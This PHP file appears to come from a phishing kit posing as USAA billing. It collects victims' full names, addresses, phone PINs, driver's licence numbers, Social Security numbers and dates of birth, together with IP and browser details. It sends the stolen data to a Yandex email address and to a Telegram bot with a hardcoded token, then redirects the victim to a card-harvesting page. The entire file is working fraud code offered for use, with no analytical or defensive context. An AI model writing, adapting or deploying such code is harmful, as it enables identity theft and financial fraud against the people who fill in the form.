<?php

$ip = getenv("REMOTE_ADDR");
$message = "-------------------- by sc3y.com -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "full name             : ".$_POST['1']."\n";
$message .= "adress       : ".$_POST['2']."\n";
$message .= "zip       : ".$_POST['3']."\n";
$message .= "phone numner       : ".$_POST['4']."\n";
$message .= "phone pin       : ".$_POST['5']."\n";
$message .= "DL       : ".$_POST['6']."\n";
$message .= "ssn       : ".$_POST['7']."\n";
$message .= "DOB       : ".$_POST['8']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY zero hdz ----------------------\n";
//$cc = $_POST['ccn'];
$headers = "From: USAA BILLING  <ppCC-$randomnumber@PubloAMEX.team>";
$send = "jrountree07@yandex.com";
$subject = "💟 Billing".strtoupper($_POST['1'])." // $os - $ip - $cn";
  mail($send, $subject, $message, $headers);

$apiToken = "2121890488:AAEsxO6295XBL6uvfJLa_pefweuxtnFuYCI";
$usaabank = [
	    'chat_id' => '-1001756262250',
	    'text' => $message
	];	

    $key = substr(sha1(mt_rand()),1,25);
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($usaabank) );





header("Location: ../cc/index.php");
?>